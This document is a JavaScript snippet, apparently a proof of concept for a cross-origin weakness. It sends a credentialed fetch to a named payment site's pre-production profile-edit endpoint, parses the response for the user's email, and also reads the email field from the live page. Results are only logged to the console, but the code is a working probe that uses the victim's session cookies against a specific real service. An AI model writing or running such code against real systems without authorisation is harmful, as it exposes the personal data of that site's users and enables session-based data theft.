(async function(){
  const TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
  try {
    const res = await fetch(TARGET, { credentials: "include", redirect: "follow" });
    console.info("[SAFE-DBG] status:", res.status, "type:", res.type, "finalURL:", res.url);

    let text = "";
    try {
      text = await res.text();
      console.info("[SAFE-DBG] response length:", text.length);
      console.info("[SAFE-DBG] preview:\n", text.slice(0,500));
    } catch(e) {
      console.warn("[SAFE-DBG] cannot read response body (likely CORS/opaque):", e);
    }

    // If readable, parse and log email (no exfil)
    if (text) {
      try {
        const doc = new DOMParser().parseFromString(text, "text/html");
        const inp = doc.querySelector('input[name="email"], input[name=email]');
        const email = inp ? (inp.value || inp.getAttribute('value') || "") : null;
        console.info("[SAFE-DBG] extracted email (from fetched HTML):", email);
      } catch(e){
        console.warn("[SAFE-DBG] DOMParser parse failed:", e);
      }
    }

    // Also check current page DOM (if the field is present client-side)
    try {
      const live = document.querySelector('input[name="email"], input[name=email]');
      console.info("[SAFE-DBG] current page DOM email:", live ? (live.value || live.getAttribute('value')) : null);
    } catch(e){ console.warn("[SAFE-DBG] current DOM check failed:", e); }

  } catch (err) {
    console.error("[SAFE-DBG] fetch failed:", err);
  }
})();
